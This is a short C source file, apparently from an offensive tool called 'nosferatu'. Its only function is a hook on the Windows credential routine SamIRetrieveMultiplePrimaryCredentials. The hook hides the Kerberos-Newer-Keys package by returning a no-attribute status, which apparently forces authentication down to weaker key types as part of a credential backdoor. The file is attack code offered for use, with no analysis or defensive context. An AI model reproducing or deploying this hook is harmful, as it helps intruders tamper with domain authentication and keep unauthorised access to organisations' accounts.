#include "pch.h"
#include "nosferatu.h"

NTSTATUS HookSamIRetrieveMultiplePrimaryCredentials(unsigned int UserHandle, unsigned int nPackages, PUNICODE_STRING PackageNames, unsigned int Credentials)
{
    if (PackageNames && wcsncmp(PackageNames->Buffer, L"Kerberos-Newer-Keys", wcslen(L"Kerberos-Newer-Keys")) == 0)
        return STATUS_DS_NO_ATTRIBUTE_OR_VALUE;

    return SamIRetrieveMultiplePrimaryCredentials(UserHandle, nPackages, PackageNames, Credentials);
}
